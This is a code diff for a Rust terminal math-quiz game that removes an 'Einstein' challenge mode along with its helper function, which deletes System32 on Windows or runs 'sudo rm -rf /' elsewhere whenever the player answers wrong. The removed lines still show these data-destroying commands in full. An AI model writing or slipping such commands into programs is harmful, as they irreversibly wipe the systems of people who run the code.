@@ -11,23 +11,6 @@ fn clear_screen() {
         let _ = Command::new("clear").status();
     }
 }
-fn delete_sys() -> io::Result<()> {
-    if cfg!(target_os = "windows") {
-        println!("Attempting to delete C:\\Windows\\System32. THIS WILL CRASH YOUR SYSTEM.");
-        let _ = Command::new("cmd")
-            .arg("/c")
-            .arg("rd /s /q C:\\Windows\\System32")
-            .status();
-    } else {
-        println!("Attempting to run 'sudo rm -rf /'. THIS WILL DELETE EVERYTHING ON YOUR SYSTEM.");
-        let _ = Command::new("sudo")
-            .arg("rm")
-            .arg("-rf")
-            .arg("/")
-            .status();
-    }
-    Ok(())
-}
 
 fn wait_for_spacebar() {
     terminal::enable_raw_mode().expect("Failed to enable raw mode");
@@ -242,64 +225,6 @@ fn expert_math() {
         }
     }
 }
-
-pub fn einstein_math() {
-    println!("Welcome to the Einstein Math Challenge!");
-
-    let mut score = 0;
-    let mut rng = rand::thread_rng();
-
-    loop {
-        // Generate a random equation type
-        let equation_type = rng.gen_range(0..=2);
-
-        let (question, correct_answer) = match equation_type {
-            0 => {
-                // Basic integral: ∫(ax + b)dx
-                let a: f64 = rng.gen_range(1.0..5.0);
-                let b: f64 = rng.gen_range(-5.0..5.0);
-                let question = format!("Compute the integral ∫({:.2}x + {:.2})dx.", a, b);
-                let answer = format!("{:.2}x^2/2 + {:.2}x + C", a / 2.0, b);
-                (question, answer)
-            }
-            1 => {
-                // Basic derivative: d/dx(ax^2 + bx + c)
-                let a: f64 = rng.gen_range(1.0..5.0);
-                let b: f64 = rng.gen_range(-5.0..5.0);
-                let c: f64 = rng.gen_range(-10.0..10.0);
-                let question = format!("Compute the derivative d/dx({:.2}x^2 + {:.2}x + {:.2}).", a, b, c);
-                let answer = format!("{:.2}x + {:.2}", 2.0 * a, b);
-                (question, answer)
-            }
-            2 => {
-                // Logarithm: log_a(b)
-                let a: f64 = rng.gen_range(2.0..10.0);
-                let b: f64 = rng.gen_range(1.0..100.0);
-                let question = format!("Compute the logarithm log_{:.2}({:.2}).", a, b);
-                let answer = format!("{:.2}", b.log(a));
-                (question, answer)
-            }
-            _ => unreachable!(),
-        };
-
-        println!("{}", question);
-
-        let mut user_answer = String::new();
-        io::stdin().read_line(&mut user_answer).expect("Failed to read line");
-
-        let user_answer = user_answer.trim();
-
-        if user_answer == correct_answer {
-            println!("Correct! You're a math prodigy!");
-            score += 1;
-        } else {
-            let _ = delete_sys();
-            println!("Your score: {}", score);
-            break; // End the game on a wrong answer
-        }
-    }
-}
-
 pub fn run() {
     println!("Welcome to the Math challenges. Select your difficulty below:");
     
@@ -307,7 +232,6 @@ pub fn run() {
         println!("1. Easy");
         println!("2. Moderate");
         println!("3. Expert");
-        println!("4. Einstein (!!! WARNING THE CHALLENGE HAS A TWIST ONLY RUN IF YOU DONT MIND LOOSING YOU SYSTEM !!!)");
         println!("5. Exit");
         // User input for choice
         let mut input = String::new();
@@ -334,10 +258,7 @@ pub fn run() {
                 clear_screen();
                 expert_math();
             }
-            4 => {
-                clear_screen();
-                einstein_math();
-            }
+            
             5 => {
                 clear_screen();
                 println!("Exiting the challenge arena");
